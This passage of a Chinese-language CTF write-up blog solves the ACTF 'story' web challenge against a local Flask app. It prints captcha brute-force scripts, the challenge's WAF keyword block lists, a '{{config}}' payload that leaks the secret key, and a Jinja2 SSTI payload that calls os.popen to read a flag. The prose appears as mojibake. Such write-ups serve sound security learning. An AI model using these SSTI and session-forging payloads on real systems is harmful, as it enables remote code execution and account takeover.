int(time.time())</span></span><br><span class="line"></span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">    gen.generate()</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    requests.get(url1 + <span class="string">"captcha"</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rawBody = "{\"captcha\":\""+captcha+"\"}"</span></span><br><span class="line">    json = {<span class="string">"captcha"</span>: captcha}</span><br><span class="line">    <span class="comment"># print("json:" + f"{json}")</span></span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line">    headers2 = {<span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"User-Agent"</span>:</span><br><span class="line">        <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line">                <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"en"</span>,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>}</span><br><span class="line">    cookies = {<span class="string">"session"</span>: <span class="string">"eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac"</span>}</span><br><span class="line">    res = session.post(url1 + <span class="string">"vip"</span>, json=json, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>å› ä¸ºçˆ†ç ´ï¼Œå‡¹æ¦‚ç‡ï¼Œå¾ªç¯è·‘å°±è¡Œ</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101112607.png" alt="å¾®ä¿¡æˆªå›¾_20231101112607"></p>
<p>å“ˆå“ˆå“ˆï¼ğŸ‘´ã¯ä¸€ç•ªã®å¤©æ‰ã </p>
<p>æœ‰ waf, é¢ç™½ã„ï¼</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rule = [</span><br><span class="line">    [<span class="string">'\\x'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'.'</span>,<span class="string">'getitem'</span>,<span class="string">'print'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'getattribute'</span>,<span class="string">'config'</span>],                   <span class="comment"># rule 1</span></span><br><span class="line">    [<span class="string">'('</span>,<span class="string">']'</span>,<span class="string">'getitem'</span>,<span class="string">'_'</span>,<span class="string">'%'</span>,<span class="string">'print'</span>,<span class="string">'config'</span>,<span class="string">'args'</span>,<span class="string">'values'</span>,<span class="string">'|'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'dict'</span>,<span class="string">','</span>,<span class="string">'join'</span>,<span class="string">'.'</span>,<span class="string">'set'</span>],              <span class="comment"># rule 2</span></span><br><span class="line">    [<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'dict'</span>,<span class="string">','</span>,<span class="string">'config'</span>,<span class="string">'join'</span>,<span class="string">'\\x'</span>,<span class="string">')'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'attr'</span>,<span class="string">'__'</span>,<span class="string">'list'</span>,<span class="string">'globals'</span>,<span class="string">'.'</span>],                           <span class="comment"># rule 3</span></span><br><span class="line">    [<span class="string">'['</span>,<span class="string">')'</span>,<span class="string">'getitem'</span>,<span class="string">'request'</span>,<span class="string">'.'</span>,<span class="string">'|'</span>,<span class="string">'config'</span>,<span class="string">'popen'</span>,<span class="string">'dict'</span>,<span class="string">'doc'</span>,<span class="string">'\\x'</span>,<span class="string">'_'</span>,<span class="string">'\{\{'</span>,<span class="string">'mro'</span>],                          <span class="comment"># rule 4</span></span><br><span class="line">    [<span class="string">'\\x'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'config'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'\{\{'</span>,<span class="string">'.'</span>,<span class="string">'request'</span>,<span class="string">'|'</span>,<span class="string">'attr'</span>],                          <span class="comment"># rule 5</span></span><br><span class="line">    [<span class="string">'print'</span>, <span class="string">'class'</span>, <span class="string">'import'</span>, <span class="string">'eval'</span>, <span class="string">'__'</span>, <span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'cookies'</span>,<span class="string">'values'</span>,<span class="string">'|'</span>,<span class="string">'\\x'</span>,<span class="string">'getitem'</span>]                  <span class="comment"># rule 6</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">minic_waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    waf_seq = random.sample(<span class="built_in">range</span>(<span class="number">21</span>),<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> singel_waf(<span class="built_in">input</span>, rule[waf_seq[index]]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></tbody></table></figure>
<p>è§„åˆ™æ¯”è¾ƒç‹¬ç‰¹ï¼Œå…­ä¸ªè§„åˆ™éšæœºç”Ÿæˆä¸‰ä¸ªï¼Œå…¶å®åªéœ€æ»¡è¶³ä¸€æ¡å°±è¡Œï¼ŒåŒæ ·æ˜¯å‡¹æ¦‚ç‡.</p>
<p>è¿™ç§ ssti éšä¾¿æ‰“ï¼Œæ‹¿ä¸ªå¯†é’¥å…ˆ.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 =<span class="string">"http://127.0.0.1:15000/"</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line"><span class="string">"story"</span></span><br><span class="line">:</span><br><span class="line"><span class="string">"{{config}}"</span></span><br><span class="line">}</span><br><span class="line">cookies = {<span class="string">"session"</span>:<span class="string">"eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE"</span>}</span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url=url1+<span class="string">"write"</span>,json=data,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        cookie = res.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">"="</span>)[<span class="number">1</span>].split(<span class="string">";"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        res2 = requests.get(url=url1+<span class="string">"story"</span>,cookies = {<span class="string">"session"</span>:cookie})</span><br><span class="line">        <span class="built_in">print</span>(res2.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure>
<p>è¿™ç§çˆ†ç ´å¯¹ğŸ‘´æ¥è¯´è¿˜æ˜¯å¤ªç®€å•äº†ï¼Œéšéšä¾¿ä¾¿å†™ä¸ªè„šæœ¬å†²äº†</p>
<p>æ‹¿åˆ°å¯†é’¥èƒ½å¹²å¾ˆå¤šäº‹äº†ï¼Œ</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'6e409b39-94e4-4557-9549-961bafdebf98'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_get</span>():</span><br><span class="line">    session[<span class="string">'story'</span>] = <span class="string">"{{url_for.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}}"</span></span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">'story'</span>] </span><br></pre></td></tr></tbody></table></figure>
<p>ğŸ‘´ä¸æƒ³è·‘ flasksession è„šæœ¬ï¼Œå¤ªæ‡’äº†ï¼Œè´¹åŠ²ï¼ŒğŸ˜¡,ğŸ‘´å°±ç›´æ¥åœ¨è·¯ç”±é‡Œé¢è®¾ç½®äº†.</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101135012.png" alt="å¾®ä¿¡æˆªå›¾_20231101135012"></p>
<p>eeeeeeeeez!</p>
<p>å…¶å®ƒç®€å•çš„é¢˜ï¼ŒğŸ‘´ä¸æƒ³åŠ¨äº†.</p>
<p>ç»ˆäºğŸ›å®Œäº†ï¼Œå¥½ğŸ“•ğŸ‘šå•Š</p>
<p>ã“ã‚ŒãŒå›ã®çŸ¥ã‚‰ãªã„ç‰©èª</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://1llustrious.github.io">1llustrious</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/">https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%A4%8D%E7%8E%B0/">å¤ç°</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/02/sctf/" title="sctf"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">sctf</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="å…³äºDASçš„å°è®°"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720531.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">å…³äºDASçš„å°è®°</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202312011458070.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-04</div><div class="title">JQCTF-Webshell-ng</div></div></a></div><div><a href="/2023/12/02/sctf/" title="sctf"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-02</div><div class="title">sctf</div></div></a></div><div><a href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTFå°è®°"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-09</div><div class="title">PCTFå°è®°</div></div></a></div><div><a href="/2023/11/30/DAS0RAYSXCBCTF/" title="DAS0RAYSXCBCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">DAS0RAYSXCBCTF</div></div></a></div><div><a href="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/" title="å…³äºDASçš„å°è®°"><img class="cover" src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720531.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">å…³äºDASçš„å°è®°</div></div></a></div><div><a href="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/" title="N1CTF_å¤ç°"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">N1CTF_å¤ç°</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">1llustrious</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1llustrious"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text"> å†™åœ¨å‰é¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-latex"><span class="toc-number">2.</span> <span class="toc-text"> easy latex</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#new-url-%E7%89%B9%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text"> new URL ç‰¹æ€§ğŸ˜‚</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text"> è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#visit-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text"> visit è§¦å‘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hooks"><span class="toc-number">3.</span> <span class="toc-text"> hooks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#what-is-webhook"><span class="toc-number">3.1.</span> <span class="toc-text"> what is webhookğŸ¤”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#abusing-jenkins-login"><span class="toc-number">3.2.</span> <span class="toc-text"> Abusing Jenkins login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%93"><span class="toc-number">3.3.</span> <span class="toc-text"> å¼€æ‰“ğŸ˜¤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#~ave-mujicas-masquerade~"><span class="toc-number">4.</span> <span class="toc-text"> ~Ave Mujicaâ€™s Masquerade~</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%86%B2"><span class="toc-number">4.1.</span> <span class="toc-text"> æºç ï¼Œå†²ğŸ˜“</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#story"><span class="toc-number">5.</span> <span class="toc-text"> story</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text"> æºç ğŸ¤”</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTFå°è®°"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PCTFå°è®°"></a><div class="content"><a class="title" href="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/" title="PCTFå°è®°">PCTFå°è®°</a><time datetime="2023-12-08T16:00:21.000Z" title="Created 2023-12-09 00:00:21">2023-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312011458070.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JQCTF-Webshell-ng"></a><div class="content"><a class="title" href="/2023/12/04/JQCTF-Webshell-ng/" title="JQCTF-Webshell-ng">JQCTF-Webshell-ng</a><time datetime="2023-12-03T23:55:48.000Z" title="Created 2023-12-04 07:55:48">2023-12-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/03/%E5%8F%91%E7%94%B5%E6%97%A5%E8%AE%B0-%E4%B8%80/" title="å‘ç”µæ—¥è®°(ä¸€)">å‘ç”µæ—¥è®°(ä¸€)</a><time datetime="2023-12-03T03:58:53.000Z" title="Created 2023-12-03 11:58:53">2023-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/sctf/" title="sctf"><img src="https://raw.githubusercontent.com/1llustrious/img/main/20231130172050.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sctf"></a><div class="content"><a class="title" href="/2023/12/02/sctf/" title="sctf">sctf</a><time datetime="2023-12-02T14:29:09.000Z" title="Created 2023-12-02 22:29:09">2023-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/" title="ACTF-å¤ç°"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ACTF-å¤ç°"></a><div class="content"><a class="title" href="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/" title="ACTF-å¤ç°">ACTF-å¤ç°</a><time datetime="2023-12-02T00:12:41.000Z" title="Created 2023-12-02 08:12:41">2023-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">Â©2020 - 2023 By 1llustrious</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/bundle.js"></script></body></html>